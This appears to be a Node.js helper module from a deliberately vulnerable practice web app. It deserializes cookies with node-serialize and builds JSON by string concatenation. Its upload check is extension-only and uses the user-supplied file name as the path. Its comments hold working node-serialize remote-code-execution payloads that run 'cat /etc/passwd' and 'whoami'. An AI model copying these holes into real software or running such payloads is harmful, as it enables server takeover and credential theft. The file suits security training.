const { error } = require('console');
var serialize = require('node-serialize');
const { format } = require('path');

//Utility
function getDeserializeData(data) {
    
    try {
        var serialize = require('node-serialize');
        var str = new Buffer(data, 'base64').toString('ascii');
        var obj = serialize.unserialize(str);
        if (obj.name) {
            return obj.name;
            
        } else {
            return "User data not found";
        }
    } catch (e) {
        return error;
    }
}

function setProfileCookie(req, res) {
    
    let userCookie = '{"id":"' + req.session.userId + '","name" : "' + req.body.name + '"}';
    let buff = new Buffer(userCookie);
    let base64data = buff.toString('base64');
    
    res.cookie('user', base64data, {
        maxAge: 900000,
        httpOnly: true
    });
}

function fileCheck(req,res){

    let fileName;

    if (!req.files || Object.keys(req.files).length === 0) {
        return "No File Selected";
        }
    
    fileName = req.files.pic.name
    console.log(fileName)

    const format = fileName.substr(fileName.length - 4)
    if(format === '.png' || format === '.jpg'){
        
        uploadPath = './public/images/' + fileName;
        console.log(uploadPath)

        req.files.pic.mv(uploadPath, function(err) {
            if (err)
              return "An Error Has Occured";
        
            return "File Uploaded"
          });
    }else{
        return "File Type Not Allowed"
    }

}

module.exports = {
    getDeserializeData: getDeserializeData,
    setProfileCookie: setProfileCookie,
    fileCheck: fileCheck
};

var testpayload = {
    rce : function(){require('child_process').exec('dir', (err, stdout, stderr) => {console.log(stdout)});}
}

// {"id":"3653","fullname" : "a"}
// {"name":"_$$ND_FUNC$$_function (){ return require('child_process').execSync('cat /etc/passwd').toString(); }()"}
// var payload1 = '{"fullname":"$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\', (err, stdout, stderr) => {console.log(stdout)});}()"}'
// const encode = Buffer.from(payload1).toString('base64')
// var str = new Buffer(encode, 'base64').toString('ascii');
// serialized_test = serialize.serialize(testpayload)
// unserialized_test = serialize.unserialize(str)

// console.log("Serialized: " + serialize.serialize(testpayload) + "\n base64 " + encode)

